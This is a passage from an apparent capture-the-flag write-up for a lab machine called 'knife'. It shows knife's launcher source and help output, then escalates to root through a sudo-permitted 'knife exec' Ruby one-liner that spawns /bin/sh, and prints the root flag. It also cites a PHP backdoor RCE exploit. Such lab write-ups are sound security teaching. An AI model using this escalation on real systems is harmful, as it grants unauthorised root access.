  gem "vsphere-automation-appliance", "= 0.4.7"
  gem "vsphere-automation-cis", "= 0.4.7"
  gem "vsphere-automation-content", "= 0.4.7"
  gem "vsphere-automation-runtime", "= 0.4.7"
  gem "vsphere-automation-sdk", "= 0.4.7"
  gem "vsphere-automation-vapi", "= 0.4.7"
  gem "vsphere-automation-vcenter", "= 0.4.7"
  gem "webrick", "= 1.7.0"
  gem "winrm", "= 2.3.6"
  gem "winrm-elevated", "= 1.2.3"
  gem "winrm-fs", "= 1.3.5"
  gem "wisper", "= 2.0.1"
  gem "wmi-lite", "= 1.0.5"
  gem "yard", "= 0.9.26"
  gem "chef", "= 16.10.8"
  gem "bundler" # force activation of bundler to avoid unresolved specs if there are multiple bundler versions
  spec = Gem::Specification.find_by_name("chef", "= 16.10.8")
else
  spec = Gem::Specification.find_by_name("chef")
end

unless Gem::Specification.unresolved_deps.empty?
  $stderr.puts "APPBUNDLER WARNING: unresolved deps are CRITICAL performance bug, this MUST be fixed"
  Gem::Specification.reset
end

bin_file = spec.bin_file("knife")

Kernel.load(bin_file)
```

It was written with ruby language, let's run it and check what we can do

```
james@knife:/$ sudo /usr/bin/knife
sudo /usr/bin/knife
ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)

Usage: knife sub-command (options)
    -s, --server-url URL             Chef Infra Server URL.
        --chef-zero-host HOST        Host to start Chef Infra Zero on.
        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
    -k, --key KEY                    Chef Infra Server API client key.
        --[no-]color                 Use colored output, defaults to enabled.
    -c, --config CONFIG              The configuration file to use.
        --config-option OPTION=VALUE Override a single configuration option.
        --defaults                   Accept default values for all questions.
    -d, --disable-editing            Do not open EDITOR, just accept the data as is.
    -e, --editor EDITOR              Set the editor to use for interactive commands.
    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).
        --[no-]fips                  Enable FIPS mode.
    -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')
        --[no-]listen                Whether a local mode (-z) server binds to a port.
    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.
    -u, --user USER                  Chef Infra Server API client username.
        --print-after                Show the data after a destructive operation.
        --profile PROFILE            The credentials profile to select.
    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.
    -v, --version                    Show Chef Infra Client version.
    -y, --yes                        Say yes to all prompts for confirmation.
    -h, --help                       Show this help message.

Available subcommands: (for details, knife SUB-COMMAND --help)

** CHEF ORGANIZATION MANAGEMENT COMMANDS **
knife opc org create ORG_SHORT_NAME ORG_FULL_NAME (options)
knife opc org delete ORG_NAME
knife opc org edit ORG
knife opc org list
knife opc org show ORGNAME
knife opc org user add ORG_NAME USER_NAME
knife opc org user remove ORG_NAME USER_NAME
knife opc user create USERNAME FIRST_NAME [MIDDLE_NAME] LAST_NAME EMAIL PASSWORD
knife opc user delete USERNAME [-d] [-R]
knife opc user edit USERNAME
knife opc user list
knife opc user password USERNAME [PASSWORD | --enable-external-auth]
knife opc user show USERNAME

** ACL COMMANDS **
knife acl add MEMBER_TYPE MEMBER_NAME OBJECT_TYPE OBJECT_NAME PERMS
knife acl bulk add MEMBER_TYPE MEMBER_NAME OBJECT_TYPE REGEX PERMS
knife acl bulk remove MEMBER_TYPE MEMBER_NAME OBJECT_TYPE REGEX PERMS
knife acl remove MEMBER_TYPE MEMBER_NAME OBJECT_TYPE OBJECT_NAME PERMS
knife acl show OBJECT_TYPE OBJECT_NAME

** AZURE COMMANDS **
knife azure ag create (options)
knife azure ag list (options)
knife azure image list (options)
knife azure internal lb create (options)
knife azure internal lb list (options)
knife azure server create (options)
knife azure server delete SERVER [SERVER] (options)
knife azure server list (options)
knife azure server show SERVER [SERVER]
knife azure vnet create (options)
knife azure vnet list (options)

** AZURERM COMMANDS **
knife azurerm server create (options)
knife azurerm server delete SERVER [SERVER] (options)
knife azurerm server list (options)
knife azurerm server show SERVER (options)

** BASE COMMANDS **
Usage: /usr/bin/knife (options)

** BOOTSTRAP COMMANDS **
knife bootstrap [PROTOCOL://][USER@]FQDN (options)
knife bootstrap azure SERVER (options)
knife bootstrap azurerm SERVER (options)
Usage: /usr/bin/knife (options)
knife bootstrap windows ssh FQDN (options) DEPRECATED
knife bootstrap windows winrm FQDN (options) DEPRECATED

** CLIENT COMMANDS **
knife client bulk delete REGEX (options)
knife client create CLIENTNAME (options)
knife client delete [CLIENT [CLIENT]] (options)
knife client edit CLIENT (options)
knife client key create CLIENT (options)
knife client key delete CLIENT KEYNAME (options)
knife client key edit CLIENT KEYNAME (options)
knife client key list CLIENT (options)
knife client key show CLIENT KEYNAME (options)
knife client list (options)
knife client reregister CLIENT (options)
knife client show CLIENT (options)

** COMMAND COMMANDS **
Usage: /usr/bin/knife (options)

** CONFIG COMMANDS **
knife config list (options)
knife config show [OPTION...] (options)
Displays the value of Chef::Config[OPTION] (or all config values)
knife config use [PROFILE]

** CONFIGURE COMMANDS **
knife configure (options)
knife configure client DIRECTORY

** COOKBOOK COMMANDS **
knife cookbook bulk delete REGEX (options)
knife cookbook delete COOKBOOK VERSION (options)
knife cookbook download COOKBOOK [VERSION] (options)
knife cookbook list (options)
knife cookbook metadata COOKBOOK (options)
knife cookbook metadata from file FILE (options)
knife cookbook show COOKBOOK [VERSION] [PART] [FILENAME] (options)
knife cookbook upload [COOKBOOKS...] (options)

** DATA BAG COMMANDS **
knife data bag create BAG [ITEM] (options)
knife data bag delete BAG [ITEM] (options)
knife data bag edit BAG ITEM (options)
knife data bag from file BAG FILE|FOLDER [FILE|FOLDER..] (options)
knife data bag list (options)
knife data bag show BAG [ITEM] (options)

** EC2 COMMANDS **
knife ec2 ami list (options)
knife ec2 eni list (options)
knife ec2 flavor list (options) [DEPRECATED]
knife ec2 securitygroup list (options)
knife ec2 server create (options)
knife ec2 server delete SERVER [SERVER] (options)
knife ec2 server list (options)
knife ec2 subnet list (options)
knife ec2 vpc list (options)

** ENVIRONMENT COMMANDS **
knife environment compare [ENVIRONMENT..] (options)
knife environment create ENVIRONMENT (options)
knife environment delete ENVIRONMENT (options)
knife environment edit ENVIRONMENT (options)
knife environment from file FILE [FILE..] (options)
knife environment list (options)
knife environment show ENVIRONMENT (options)

** EXEC COMMANDS **
knife exec [SCRIPT] (options)

** GOOGLE COMMANDS **
knife google disk create NAME --gce-disk-size N (options)
knife google disk delete NAME [NAME] (options)
knife google disk list
knife google image list
knife google project quotas
knife google region list
knife google region quotas
knife google server create NAME -m MACHINE_TYPE -I IMAGE (options)
knife google server delete INSTANCE_NAME [INSTANCE_NAME] (options)
knife google server list
knife google server show INSTANCE_NAME (options)
knife google zone list

** GROUP COMMANDS **
knife group add MEMBER_TYPE MEMBER_NAME GROUP_NAME
knife group create GROUP_NAME
knife group destroy GROUP_NAME
knife group list
knife group remove MEMBER_TYPE MEMBER_NAME GROUP_NAME
knife group show GROUP_NAME

** KNIFE COMMANDS **
Usage: /usr/bin/knife (options)

** NODE COMMANDS **
knife node bulk delete REGEX (options)
knife node create NODE (options)
knife node delete [NODE [NODE]] (options)
knife node edit NODE (options)
knife node environment set NODE ENVIRONMENT
knife node from file FILE (options)
knife node list (options)
knife node policy set NODE POLICY_GROUP POLICY_NAME (options)
knife node run_list add [NODE] [ENTRY [ENTRY]] (options)
knife node run_list remove [NODE] [ENTRY [ENTRY]] (options)
knife node run_list set NODE ENTRIES (options)
knife node show NODE (options)

** PATH-BASED COMMANDS **
knife delete [PATTERN1 ... PATTERNn]
knife deps PATTERN1 [PATTERNn]
knife diff PATTERNS
knife download PATTERNS
knife edit [PATTERN1 ... PATTERNn]
knife list [-dfR1p] [PATTERN1 ... PATTERNn] (options)
knife show [PATTERN1 ... PATTERNn] (options)
knife upload PATTERNS (options)
knife xargs [COMMAND] (options)

** RAW COMMANDS **
knife raw REQUEST_PATH (options)

** RECIPE COMMANDS **
knife recipe list [PATTERN]

** REHASH COMMANDS **
knife rehash

** RESOURCE COMMANDS **
Usage: /usr/bin/knife (options)

** ROLE COMMANDS **
knife role bulk delete REGEX (options)
knife role create ROLE (options)
knife role delete ROLE (options)
knife role edit ROLE (options)
knife role env_run_list add [ROLE] [ENVIRONMENT] [ENTRY [ENTRY]] (options)
knife role env_run_list clear [ROLE] [ENVIRONMENT] (options)
knife role env_run_list remove [ROLE] [ENVIRONMENT] [ENTRIES] (options)
knife role env_run_list replace [ROLE] [ENVIRONMENT] [OLD_ENTRY] [NEW_ENTRY] (options)
knife role env_run_list set [ROLE] [ENVIRONMENT] [ENTRIES] (options)
knife role from file FILE [FILE..] (options)
knife role list (options)
knife role run_list add [ROLE] [ENTRY [ENTRY]] (options)
knife role run_list clear [ROLE] (options)
knife role run_list remove [ROLE] [ENTRY] (options)
knife role run_list replace [ROLE] [OLD_ENTRY] [NEW_ENTRY] (options)
knife role run_list set [ROLE] [ENTRIES] (options)
knife role show ROLE (options)

** SEARCH COMMANDS **
knife search INDEX QUERY (options)

** SERVE COMMANDS **
knife serve (options)

** SERVER COMMANDS **
Usage: /usr/bin/knife (options)
Usage: /usr/bin/knife (options)
Usage: /usr/bin/knife (options)
Usage: /usr/bin/knife (options)

** SSH COMMANDS **
knife ssh QUERY COMMAND (options)

** SSL COMMANDS **
knife ssl check [URL] (options)
knife ssl fetch [URL] (options)

** STATUS COMMANDS **
knife status QUERY (options)

** SUPERMARKET COMMANDS **
knife supermarket download COOKBOOK [VERSION] (options)
knife supermarket install COOKBOOK [VERSION] (options)
knife supermarket list (options)
knife supermarket search QUERY (options)
knife supermarket share COOKBOOK [CATEGORY] (options)
knife supermarket show COOKBOOK [VERSION] (options)
knife supermarket unshare COOKBOOK

** TAG COMMANDS **
knife tag create NODE TAG ...
knife tag delete NODE TAG ...
knife tag list NODE

** TIDY COMMANDS **
knife tidy backup clean (options)
knife tidy notify (options)
knife tidy server clean (options)
knife tidy server report (options)

** USER COMMANDS **
knife user create USERNAME DISPLAY_NAME FIRST_NAME LAST_NAME EMAIL PASSWORD (options)
knife user delete USER (options)
knife user dissociate USERNAMES
knife user edit USER (options)
knife user invite add USERNAMES
knife user invite list
knife user invite rescind [USERNAMES] (options)
knife user key create USER (options)
knife user key delete USER KEYNAME (options)
knife user key edit USER KEYNAME (options)
knife user key list USER (options)
knife user key show USER KEYNAME (options)
knife user list (options)
knife user reregister USER (options)
knife user show USER (options)

** VAULT COMMANDS **
knife vault create VAULT ITEM VALUES (options)
knife vault delete VAULT ITEM (options)
knife vault download VAULT ITEM PATH (options)
knife vault edit VAULT ITEM (options)
knife vault isvault VAULT ITEM (options)
knife vault itemtype VAULT ITEM (options)
knife vault list (options)
knife vault refresh VAULT ITEM
knife vault remove VAULT ITEM VALUES (options)
knife vault rotate all keys
knife vault rotate keys VAULT ITEM (options)
knife vault show VAULT [ITEM] [VALUES] (options)
knife vault update VAULT ITEM VALUES (options)

** VCENTER COMMANDS **
knife vcenter cluster list
knife vcenter datacenter list
knife vcenter host list
knife vcenter vm clone NAME (options)
knife vcenter vm create NAME
knife vcenter vm delete NAME [NAME] (options)
knife vcenter vm list
knife vcenter vm show NAME (options)

** VSPHERE COMMANDS **
knife vsphere cluster list
knife vsphere cpu ratio [CLUSTER] [HOST]
knife vsphere customization list
knife vsphere datastore file
knife vsphere datastore list
knife vsphere datastore maxfree
knife vsphere datastorecluster list
knife vsphere datastorecluster maxfree
knife vsphere folder list
knife vsphere hosts list
knife vsphere pool list
knife vsphere pool query POOLNAME QUERY. See "https://pubs.vmware.com/vi3/sdk/ReferenceGuide/vim.ComputeResource.html" for allowed QUERY values.
knife vsphere pool show POOLNAME QUERY. See "https://pubs.vmware.com/vi3/sdk/ReferenceGuide/vim.ComputeResource.html" for allowed QUERY values.
knife vsphere template list
knife vsphere vlan create NAME VID
knife vsphere vlan list
knife vsphere vm cdrom VMNAME (options)
knife vsphere vm clone VMNAME (options)
knife vsphere vm config VMNAME PROPERTY VALUE (PROPERTY VALUE)...
          See "https://www.vmware.com/support/developer/converter-sdk/conv60_apireference/vim.vm.ConfigSpec.html"
          for allowed ATTRIBUTE values (any property of type xs:string is supported).
knife vsphere vm delete VMNAME (options)
knife vsphere vm disk extend VMNAME SIZE. Extends the disk of vm VMNAME to SIZE kilobytes.
knife vsphere vm disk list VMNAME
knife vsphere vm execute VMNAME COMMAND ARGS
knife vsphere vm find
knife vsphere vm list
knife vsphere vm markastemplate VMNAME
knife vsphere vm migrate VMNAME (options)
knife vsphere vm move VMNAME
knife vsphere vm net STATE VMNAME
knife vsphere vm network add VMNAME NETWORKNAME
knife vsphere vm network delete VMNAME NICNAME
knife vsphere vm network list VMNAME
knife vsphere vm network set VMNAME NETWORKNAME
knife vsphere vm property get VMNAME PROPERTY. Gets a vApp Property on VMNAME.
knife vsphere vm property set VMNAME PROPERTY VALUE. Sets a vApp Property on VMNAME.
knife vsphere vm show VMNAME QUERY. See "https://pubs.vmware.com/vi3/sdk/ReferenceGuide/vim.VirtualMachine.html" for allowed QUERY values.
knife vsphere vm snapshot VMNAME (options)
knife vsphere vm state VMNAME (options)
knife vsphere vm toolsconfig VMNAME PROPERTY VALUE
          See "https://www.vmware.com/support/developer/vc-sdk/visdk25pubs/ReferenceGuide/vim.vm.ToolsConfigInfo.html"
          for available properties and types.
knife vsphere vm vmdk add VMNAME DISK_GB
knife vsphere vm vncset VMNAME
knife vsphere vm wait sysprep VMNAME (options)

** WINDOWS COMMANDS **
knife windows cert generate FILE_PATH (options)
knife windows cert install CERT [CERT] (options)
knife windows listener create (options)

** WINRM COMMANDS **
knife winrm QUERY COMMAND (options)

** WSMAN COMMANDS **
knife wsman test QUERY (options)

** YAML COMMANDS **
knife yaml convert YAML_FILENAME [RUBY_FILENAME]
```

Ok, we have manual how to use it. Also I find manual [here](https://docs.chef.io/workstation/knife/)

There is command [*exec*](https://docs.chef.io/workstation/knife_exec/), which allow to run any ruby scripts.

```knife exec -E 'RUBY CODE' or knife exec /path/to/script_file```

Let's create exec [ruby](https://gtfobins.github.io/gtfobins/ruby/) script to get shell

```
james@knife:/tmp$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

And we get **root.txt**

```
james@knife:/tmp$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
955389c820899fa32895d9b06652701f
```

# Resources

1. https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
2. https://github.com/flast101/php-8.1.0-dev-backdoor-rce
3. https://docs.chef.io/workstation/knife/
